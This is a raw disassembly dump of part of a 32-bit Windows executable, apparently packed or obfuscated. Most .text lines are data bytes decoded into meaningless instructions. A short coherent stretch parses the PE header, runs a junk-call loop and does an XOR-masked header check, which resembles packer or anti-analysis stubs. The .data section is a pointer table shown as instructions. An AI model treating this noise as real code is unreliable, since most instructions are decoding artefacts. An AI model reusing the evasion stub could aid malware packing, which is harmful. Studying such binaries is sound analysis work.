  411417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411418:	jne    0x411491
  41141a:	out    0x91,eax
  41141c:	outs   dx,DWORD PTR ds:[esi]
  41141d:	jmp    0x4113e9
  41141f:	inc    ebx
  411420:	push   esp
  411421:	dec    edx
  411422:	hlt    
  411423:	js     0x41143d
  411425:	xchg   cl,dl
  411427:	daa    
  411428:	ret    0xab34
  41142b:	jg     0x4113d6
  41142d:	fs (bad) 
  41142f:	adc    eax,0x5e2b0dff
  411434:	dec    edi
  411435:	out    0x37,eax
  411437:	dec    ecx
  411438:	ret    
  411439:	mov    ecx,0xe2be8270
  41143e:	(bad)  
  41143f:	xchg   edx,eax
  411440:	psubusw mm3,QWORD PTR [edi+0x3e]
  411444:	enter  0x277e,0xf5
  411448:	outs   dx,BYTE PTR ds:[esi]
  411449:	xor    ebx,DWORD PTR [eax]
  41144b:	(bad)  
  41144c:	shr    BYTE PTR [ecx+0x7bd816cc],1
  411452:	dec    esp
  411453:	mov    edi,0x66639279
  411458:	fdivr  QWORD PTR [ebx]
  41145a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41145b:	stos   BYTE PTR es:[edi],al
  41145c:	jns    0x4113e8
  41145e:	repnz pushf 
  411460:	stos   BYTE PTR es:[edi],al
  411461:	mul    DWORD PTR [ebx-0x1a6a50e5]
  411467:	addr16 xchg edx,eax
  411469:	xchg   ebp,eax
  41146a:	inc    ebp
  41146b:	sub    ah,cl
  41146d:	out    dx,al
  41146e:	mov    edx,0xc65de972
  411473:	xchg   BYTE PTR [edx+ebp*8+0x70e37f56],bl
  41147a:	repz fdivr QWORD PTR [edi]
  41147d:	neg    DWORD PTR [eax-0xc27e533]
  411483:	dec    ecx
  411484:	out    dx,eax
  411485:	jecxz  0x411414
  411487:	mov    bh,0xf2
  411489:	loope  0x4114fc
  41148b:	xor    DWORD PTR [ebx-0x64],esp
  41148e:	sub    dl,bl
  411490:	jl     0x4114b7
  411492:	scas   eax,DWORD PTR es:[edi]
  411493:	clc    
  411494:	frstor [ebp+0x5af16b4b]
  41149a:	mov    ds:0x481e5927,eax
  41149f:	or     esi,DWORD PTR [ecx+0x13857e28]
  4114a5:	and    DWORD PTR ds:0xd04a7f90,0x5799328b
  4114af:	ret    0x2807
  4114b2:	(bad)  
  4114b3:	out    0x13,eax
  4114b5:	sub    dl,BYTE PTR [eax+0x11]
  4114b8:	repz shr DWORD PTR [edi+0x75],cl
  4114bc:	mov    bh,0x1e
  4114be:	mov    bh,0xda
  4114c0:	outs   dx,BYTE PTR ds:[esi]
  4114c1:	adc    BYTE PTR [eax-0x7e],bh
  4114c4:	pop    ecx
  4114c5:	add    edx,ebx
  4114c7:	pushf  
  4114c8:	es shl edx,1
  4114cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114cc:	aad    0xb1
  4114ce:	xchg   ebp,eax
  4114cf:	ret    
  4114d0:	mov    esi,0xdb484ebc
  4114d5:	aad    0xca
  4114d7:	out    dx,eax
  4114d8:	das    
  4114d9:	add    ah,BYTE PTR [esi+0x38]
  4114dc:	push   ss
  4114dd:	cmp    eax,0xe60ac4ab
  4114e2:	js     0x41150c
  4114e4:	cwde   
  4114e5:	jne    0x41149e
  4114e7:	in     al,0x8
  4114e9:	xlat   BYTE PTR ds:[ebx]
  4114ea:	pop    ds
  4114eb:	into   
  4114ec:	adc    dh,BYTE PTR [edi+0x43]
  4114ef:	jno    0x411506
  4114f1:	cmp    dl,BYTE PTR [esi-0x1d2ca58c]
  4114f7:	test   al,0xe
  4114f9:	add    edi,DWORD PTR [edi+0x34e879b7]
  4114ff:	sub    ebx,edi
  411501:	lods   eax,DWORD PTR ds:[esi]
  411502:	test   al,0x2a
  411504:	in     al,dx
  411505:	out    0xa4,eax
  411507:	fwait
  411508:	lods   al,BYTE PTR ds:[esi]
  411509:	icebp  
  41150a:	mov    ah,0x4f
  41150c:	jecxz  0x41153a
  41150e:	add    DWORD PTR [esi-0x17ba2b63],ebp
  411514:	jmp    0x4114a0
  411516:	repz cmp eax,0x2e2c156a
  41151c:	iret   
  41151d:	jno    0x411533
  41151f:	inc    ebx
  411520:	and    bh,BYTE PTR [ebp+0x36]
  411523:	or     al,BYTE PTR [edi+0x141a754e]
  411529:	xchg   ebp,eax
  41152a:	jno    0x4114df
  41152c:	mov    bl,0x3b
  41152e:	cdq    
  41152f:	push   cs
  411530:	inc    edx
  411531:	fwait
  411532:	test   DWORD PTR [esi],eax
  411534:	xchg   ebp,eax
  411535:	ret    0x1060
  411538:	(bad)  
  411539:	hlt    
  41153a:	add    eax,0x9511aeeb
  41153f:	jp     0x41155c
  411541:	pop    ebx
  411542:	loopne 0x4114d8
  411544:	cmp    ebx,ebx
  411546:	mov    ecx,0x3829bcae
  41154b:	pause  
  41154d:	or     ebx,DWORD PTR [eax]
  41154f:	rcl    BYTE PTR [ebp-0x3f3b396b],0xea
  411556:	inc    esi
  411557:	leave  
  411558:	leave  
  411559:	pop    esi
  41155a:	add    BYTE PTR [eax-0x64d75b4d],dh
  411560:	cdq    
  411561:	enter  0xb2bf,0x9c
  411565:	hlt    
  411566:	les    ebx,FWORD PTR [edx+ebx*1]
  411569:	jnp    0x411525
  41156b:	in     al,dx
  41156c:	test   al,0xf2
  41156e:	mov    eax,0xc441581d
  411573:	jb     0x41155d
  411575:	pop    ss
  411576:	ins    BYTE PTR es:[edi],dx
  411577:	fisubr DWORD PTR cs:[eax-0x3a8619b7]
  41157e:	push   ss
  41157f:	loope  0x41156e
  411581:	and    esp,edi
  411583:	jmp    0x411532
  411585:	cmp    bh,BYTE PTR [edi+0x28e0178a]
  41158b:	setg   BYTE PTR [eax+0x58]
  41158f:	ds jmp 0x41159e
  411592:	cwde   
  411593:	sti    
  411594:	sbb    DWORD PTR [edi+edi*4+0x6c],edi
  411598:	sbb    eax,0xd2211571
  41159d:	cmp    eax,DWORD PTR [edx]
  41159f:	shr    DWORD PTR [ecx],1
  4115a1:	arpl   di,bx
  4115a3:	adc    BYTE PTR [ebx+ecx*8],cl
  4115a6:	adc    ebp,DWORD PTR [edx]
  4115a8:	cmp    DWORD PTR [edi],ecx
  4115aa:	repz add eax,0x379a51a
  4115b0:	mov    bl,0xfa
  4115b2:	cmp    eax,0x3ae8322c
  4115b7:	cli    
  4115b8:	and    DWORD PTR [ebx+0x1d],ebx
  4115bb:	adc    dh,bh
  4115bd:	int3   
  4115be:	(bad)  
  4115bf:	arpl   WORD PTR [ebx-0x46],dx
  4115c2:	pop    esi
  4115c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115c4:	jg     0x4115d6
  4115c6:	rol    BYTE PTR [eax],cl
  4115c8:	repz iret 
  4115ca:	popf   
  4115cb:	dec    edi
  4115cc:	out    0x5e,al
  4115ce:	outs   dx,DWORD PTR ds:[esi]
  4115cf:	gs jl  0x41155b
  4115d2:	popa   
  4115d3:	cmp    eax,0x3308558b
  4115d8:	ror    DWORD PTR [ebp+0x729b1084],0x32
  4115df:	add    BYTE PTR [ecx+0x45ff0845],cl
  4115e5:	or     al,0xe9
  4115e7:	sti    
  4115e8:	stc    
  4115e9:	(bad)  
  4115ea:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	mov    DWORD PTR [ebx-0x39],ebp
  41161b:	dec    eax
  41161c:	xchg   BYTE PTR [eax+0x7e],al
  41161f:	jle    0x4115c5
  411621:	jg     0x4116a1
  411623:	jle    0x4115bd
  411625:	std    
  411626:	or     al,0x22
  411628:	inc    ebp
  411629:	loope  0x4115cc
  41162b:	into   
  41162c:	sub    BYTE PTR [ebp-0x1ffab909],al
  411632:	gs jae 0x4115e0
  411635:	out    dx,al
  411636:	add    ch,BYTE PTR [ebx-0x22]
  411639:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41163a:	int3   
  41163b:	add    al,cl
  41163d:	stos   DWORD PTR es:[edi],eax
  41163e:	out    dx,al
  41163f:	pop    edi
  411640:	in     eax,dx
  411641:	inc    edx
  411642:	cmp    eax,DWORD PTR [esi]
  411644:	imul   esi,DWORD PTR [ebx+ebp*4],0xffffffb3
  411648:	mov    ah,0x73
  41164a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41164b:	sub    ebp,DWORD PTR [edx]
  41164d:	sar    BYTE PTR [ebp+0x2bedb51b],0x5a
  411654:	mov    dl,0x7c
  411656:	hlt    
  411657:	loope  0x41160a
  411659:	loop   0x411680
  41165b:	mov    al,ds:0xd2062f1c
  411660:	push   esp
  411661:	out    0x15,al
  411663:	jp     0x411660
  411665:	dec    edx
  411666:	(bad)  
  411667:	enter  0xf104,0x40
  41166b:	(bad)  
  41166c:	or     eax,0xa08f7db3
  411671:	pushf  
  411672:	dec    esi
  411673:	fild   DWORD PTR [edx-0x5a]
  411676:	mov    ch,0xbf
  411678:	je     0x41160a
  41167a:	add    al,0x36
  41167c:	out    dx,eax
  41167d:	mov    WORD PTR [edi-0x457c605f],ss
  411683:	outs   dx,DWORD PTR ds:[esi]
  411684:	jmp    0x4116e1
  411686:	icebp  
  411687:	and    DWORD PTR [edi],eax
  411689:	cmp    ebx,ebp
  41168b:	mov    eax,ds:0x9694ee87
  411690:	daa    
  411691:	fist   DWORD PTR ds:0x37367cfa
  411697:	or     eax,0xdae05eb0
  41169c:	shr    BYTE PTR [edi],cl
  41169e:	and    eax,0x2563e4d6
  4116a3:	jmp    0x875e:0xe28ec9a6
  4116aa:	inc    edx
  4116ab:	ds clc 
  4116ad:	xchg   ebp,eax
  4116ae:	sbb    edi,0x16
  4116b1:	aaa    
  4116b2:	call   0x659ba98a
  4116b7:	ret    
  4116b8:	mov    DWORD PTR [ebp+0x62a80461],0x2956f72
  4116c2:	popf   
  4116c3:	and    al,0x31
  4116c5:	jb     0x411715
  4116c7:	mov    esi,0x37743f27
  4116cc:	fdiv   st,st(5)
  4116ce:	repnz iret 
  4116d0:	call   FWORD PTR [edi]
  4116d2:	push   ebp
  4116d3:	cs jmp 0x411685
  4116d6:	dec    edi
  4116d7:	jg     0xbb492a29
  4116dd:	dec    esi
  4116de:	mov    ds:0x3e7d7446,eax
  4116e3:	or     al,0x3f
  4116e5:	jne    0x411742
  4116e7:	sub    ah,BYTE PTR [ecx-0x7a]
  4116ea:	mov    esp,0xcb898652
  4116ef:	cmp    al,0x7d
  4116f1:	dec    esp
  4116f2:	lahf   
  4116f3:	outs   dx,DWORD PTR ds:[esi]
  4116f4:	mov    esp,0x855e89ce
  4116f9:	push   eax
  4116fa:	aam    0xff
  4116fc:	mov    BYTE PTR [ebx+edx*2+0x64],0x2e
  411701:	jno    0x4116bc
  411703:	pop    esi
  411704:	iret   
  411705:	fisub  DWORD PTR [ebx+0x5a]
  411708:	adc    esi,DWORD PTR [eax+0x7]
  41170b:	pop    esp
  41170c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41170d:	mov    WORD PTR [ecx+eax*1-0x71],?
  411711:	pop    edi
  411712:	or     DWORD PTR [esi+ebx*1],eax
  411715:	jl     0x41173f
  411717:	or     al,0x5a
  411719:	stos   BYTE PTR es:[edi],al
  41171a:	jbe    0x4116c1
  41171c:	sub    al,0x47
  41171e:	scas   eax,DWORD PTR es:[edi]
  41171f:	mov    esi,0x2604132c
  411724:	push   0xffffffab
  411726:	fwait
  411727:	test   bh,bl
  411729:	sbb    bl,ah
  41172b:	stos   BYTE PTR es:[edi],al
  41172c:	mov    bh,0xac
  41172e:	arpl   WORD PTR [edi],bx
  411730:	std    
  411731:	dec    edx
  411732:	cdq    
  411733:	ret    
  411734:	ret    0xc37b
  411737:	jp     0x4117a2
  411739:	adc    eax,0x1f84681b
  41173e:	mov    ?,ebx
  411740:	ret    0xd520
  411743:	push   ebp
  411744:	or     dh,ah
  411746:	gs mov dl,0x25
  411749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41174a:	aam    0x8a
  41174c:	stos   BYTE PTR es:[edi],al
  41174d:	icebp  
  41174e:	aam    0x7c
  411750:	sbb    ch,0xb0
  411753:	sub    ebp,DWORD PTR [edi+edx*2]
  411756:	push   esp
  411757:	in     eax,dx
  411758:	test   DWORD PTR [ebp-0xdded65b],eax
  41175e:	pop    esp
  41175f:	lea    edi,[eax-0x6b]
  411762:	adc    dl,dh
  411764:	inc    bl
  411766:	adc    al,BYTE PTR [esi-0x50]
  411769:	sbb    esi,ebx
  41176b:	sbb    ebx,edx
  41176d:	jno    0x411709
  41176f:	(bad)  
  411770:	ror    ah,1
  411772:	cli    
  411773:	sbb    ebx,ebp
  411775:	fs dec edi
  411777:	inc    ecx
  411778:	xchg   ebp,eax
  411779:	ret    0x4e1f
  41177c:	add    cl,ah
  41177e:	sbb    DWORD PTR [ebp+ebp*4+0x18],edi
  411782:	(bad)  
  411784:	addr16 jae 0x4117cf
  411787:	fcomp  DWORD PTR [esi]
  411789:	sbb    BYTE PTR [eax+0x8],bh
  41178c:	and    BYTE PTR [ecx+0x13],ah
  41178f:	xor    esp,0xffffffd0
  411792:	push   ds
  411793:	dec    ecx
  411794:	dec    ebp
  411795:	adc    eax,0x3d847b45
  41179a:	fstp   QWORD PTR [ebx-0x55a15925]
  4117a0:	les    ebx,FWORD PTR [esi+0x17]
  4117a3:	mov    bl,0x80
  4117a5:	jbe    0x4117b5
  4117a7:	cmc    
  4117a8:	mov    edx,0x5cc5f488
  4117ad:	call   FWORD PTR [edx-0x7e]
  4117b0:	(bad)
  4117b4:	and    BYTE PTR [ebx+0x3a],0x1b
  4117b8:	pusha  
  4117b9:	jg     0x411808
  4117bb:	mov    edx,0x209fc73a
  4117c0:	retf   0x2b2d
  4117c3:	dec    edi
  4117c4:	mul    ah
  4117c6:	adc    eax,0x6e932b2
  4117cb:	xor    esp,DWORD PTR [ebx-0x14]
  4117ce:	mov    eax,DWORD PTR [ebp+0x8]
  4117d1:	mov    DWORD PTR ds:0x4336a3,0x423d
  4117db:	mov    al,BYTE PTR [eax]
  4117dd:	sub    DWORD PTR ds:0x4335ff,0x6d7d
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43369f,0x433603
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43369f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43361b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x4336ab,0x0
  41182f:	mov    eax,ds:0x4336ab
  411834:	inc    eax
  411835:	mov    ds:0x4336ab,eax
  41183a:	cmp    DWORD PTR ds:0x4336ab,0xb
  411841:	jne    0x411887
  411847:	push   0x4337bc
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x4336ab,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x4336ab
  411899:	inc    eax
  41189a:	mov    ds:0x4336ab,eax
  41189f:	cmp    DWORD PTR ds:0x4336ab,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	rol    ch,0x1f
  4118ea:	enter  0x4e2c,0x7e
  4118ee:	jle    0x411894
  4118f0:	jg     0x411970
  4118f2:	jle    0x4118fb
  4118f4:	cmp    al,0x56
  4118f6:	pop    ebx
  4118f7:	mov    dl,0xa5
  4118f9:	rcr    bl,0x81
  4118fc:	push   esp
  4118fd:	outs   dx,BYTE PTR ds:[esi]
  4118fe:	into   
  4118ff:	lock and DWORD PTR [esi],esp
  411902:	and    eax,0xb502cb86
  411907:	adc    eax,0x9fc4e061
  41190c:	add    dh,BYTE PTR [esi]
  41190e:	mov    dl,0x76
  411910:	jbe    0x411921
  411912:	jae    0x411960
  411914:	inc    esp
  411915:	ins    DWORD PTR es:[edi],dx
  411916:	fwait
  411917:	ror    BYTE PTR [edx],0xb0
  41191a:	hlt    
  41191b:	mov    cl,0xd8
  41191d:	mov    ds:0x5a110a77,al
  411922:	call   FWORD PTR [esi+ebp*8]
  411925:	jmp    0x411994
  411927:	loope  0x4118f0
  411929:	cdq    
  41192a:	push   esp
  41192b:	out    0x11,eax
  41192d:	mov    ecx,0xde1ec4a8
  411932:	gs retf 0x24e6
  411936:	aam    0xa2
  411938:	sbb    bh,dl
  41193a:	jo     0x411954
  41193c:	inc    ebp
  41193d:	cmp    eax,0x7fe938da
  411942:	pusha  
  411943:	(bad)  
  411944:	pop    ebp
  411945:	inc    eax
  411946:	xor    BYTE PTR [eax+0x37c8394f],ah
  41194c:	jg     0x41199b
  41194e:	out    dx,eax
  41194f:	ds mov ecx,0x1ce7c212
  411955:	inc    esp
  411956:	sub    al,0xfb
  411958:	stc    
  411959:	loope  0x4118f6
  41195b:	mov    bh,0x2d
  41195d:	call   0xc42b:0xa7614c0a
  411964:	scas   al,BYTE PTR es:[edi]
  411965:	pop    ds
  411966:	xor    ch,bh
  411968:	mov    al,0x77
  41196a:	outs   dx,DWORD PTR ds:[esi]
  41196b:	push   cs
  41196c:	or     BYTE PTR [esi+0xadb255c],dh
  411972:	add    BYTE PTR [esi-0x47],cl
  411975:	aas    
  411976:	add    eax,0x651b1855
  41197b:	dec    ecx
  41197c:	inc    esi
  41197d:	mov    eax,ds:0x995d7d75
  411982:	adc    al,0xa2
  411984:	ret    
  411985:	push   edi
  411986:	(bad)  
  411987:	in     eax,0x99
  411989:	(bad)  
  41198a:	adc    eax,0x7b195b92
  41198f:	mov    bh,BYTE PTR [esi]
  411991:	mov    cl,0xdb
  411993:	mov    edx,0x2fba97be
  411998:	jecxz  0x411929
  41199a:	out    dx,eax
  41199b:	mov    DWORD PTR [edi+0x646f2b51],ebp
  4119a1:	mov    al,0xc1
  4119a3:	pop    edi
  4119a4:	sbb    dh,bh
  4119a6:	xchg   esp,eax
  4119a7:	mov    ebx,0xadfb737d
  4119ac:	das    
  4119ad:	leave  
  4119ae:	into   
  4119af:	mov    dh,0x71
  4119b1:	fcmove st,st(1)
  4119b3:	pop    eax
  4119b4:	pop    edx
  4119b5:	lods   al,BYTE PTR ds:[esi]
  4119b6:	jmp    0x411971
  4119b8:	mov    esi,edx
  4119ba:	sti    
  4119bb:	push   es
  4119bc:	jecxz  0x4119ed
  4119be:	push   0x2badcb83
  4119c3:	sbb    BYTE PTR [ecx],al
  4119c5:	xchg   edx,eax
  4119c6:	(bad)  
  4119c7:	loopne 0x411a18
  4119c9:	adc    cl,ch
  4119cb:	dec    ebp
  4119cc:	xchg   ecx,eax
  4119cd:	lods   al,BYTE PTR ds:[esi]
  4119ce:	(bad)
  4119d1:	push   edx
  4119d2:	inc    esp
  4119d3:	sahf   
  4119d4:	or     bl,BYTE PTR [eax+0x4a]
  4119d7:	stc    
  4119d8:	mov    bl,0xc9
  4119da:	mov    ebp,0x66c234de
  4119df:	jle    0x411a5a
  4119e1:	jo     0x41198e
  4119e3:	sbb    DWORD PTR [ebx-0x7f],edi
  4119e6:	inc    esi
  4119e7:	mov    eax,ds:0x24507d18
  4119ec:	inc    esp
  4119ed:	inc    esi
  4119ee:	cmp    DWORD PTR [ebp-0x1daae34a],ebx
  4119f4:	fs retf 0x9705
  4119f8:	fsub   QWORD PTR [edi+0x72e8cc69]
  4119fe:	mov    dx,0xc876
  411a02:	outs   dx,DWORD PTR ds:[esi]
  411a03:	nop
  411a04:	(bad)  
  411a05:	fild   WORD PTR ds:0xaf2f867c
  411a0b:	dec    eax
  411a0c:	sub    esp,DWORD PTR [ebp-0x4f3aed75]
  411a12:	pop    edx
  411a13:	and    al,0x43
  411a15:	in     eax,0xe5
  411a17:	outs   dx,BYTE PTR ds:[esi]
  411a18:	and    BYTE PTR [eax],0xa0
  411a1b:	mov    cl,0x2e
  411a1d:	pop    ds
  411a1e:	fadd   QWORD PTR [edx+0x35]
  411a21:	add    DWORD PTR [ecx+esi*4+0x4217cd9c],edi
  411a28:	jae    0x411a56
  411a2a:	rol    DWORD PTR [edi+0x6e],1
  411a2d:	fldcw  WORD PTR [ebx+0x51]
  411a30:	mov    eax,0x6d9f2489
  411a35:	sbb    al,0x83
  411a37:	jno    0x4119ca
  411a39:	or     eax,0x9a9c83b9
  411a3e:	enter  0x80f3,0xc1
  411a42:	out    0x4d,al
  411a44:	jl     0x411a1d
  411a46:	inc    edx
  411a47:	mov    DWORD PTR [edi-0x70afa73b],edi
  411a4d:	adc    BYTE PTR ds:0x34701220,dl
  411a53:	out    0x79,eax
  411a55:	mov    bh,0x11
  411a57:	jecxz  0x411a93
  411a59:	pop    esi
  411a5a:	test   DWORD PTR [esi],esi
  411a5c:	(bad)  
  411a5d:	aaa    
  411a5e:	fstp   QWORD PTR [edx+0x3bde07f0]
  411a64:	dec    eax
  411a65:	pop    esp
  411a66:	sahf   
  411a67:	add    edi,0xb29a1875
  411a6d:	add    al,0xab
  411a6f:	ret    
  411a70:	cld    
  411a71:	adc    bl,BYTE PTR [ebp+0x728aaca7]
  411a77:	shr    DWORD PTR [esi],1
  411a79:	xor    al,0xcb
  411a7b:	jp     0x411a0b
  411a7d:	or     al,0x6
  411a7f:	rcr    dh,1
  411a81:	inc    ebx
  411a82:	outs   dx,DWORD PTR ds:[esi]
  411a83:	aam    0xcd
  411a85:	sub    DWORD PTR [eax+esi*4],0xa41b3ba5
  411a8c:	xor    eax,0x945b26a5
  411a91:	dec    ebx
  411a92:	outs   dx,BYTE PTR ds:[esi]
  411a93:	or     al,0x80
  411a95:	sub    BYTE PTR [esi+0x6],ah
  411a98:	mov    bl,0x74
  411a9a:	cli    
  411a9b:	add    eax,0xe9c1033e
  411aa0:	or     eax,0x8b000000
  411aa5:	inc    ebp
  411aa6:	cld    
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
